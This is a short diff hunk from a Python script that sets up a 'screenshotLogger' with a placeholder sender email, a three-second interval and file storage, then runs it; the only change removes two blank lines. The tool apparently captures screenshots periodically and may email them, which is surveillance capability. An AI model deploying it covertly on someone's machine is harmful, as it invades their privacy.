@@ -41,8 +41,6 @@ sl = screenshotLogger(sender_email='example@gmail.com',
                       interval=3,
                       store='file')
 slv = sl.validate()
-
-
 sl.execute(slv)
 
 
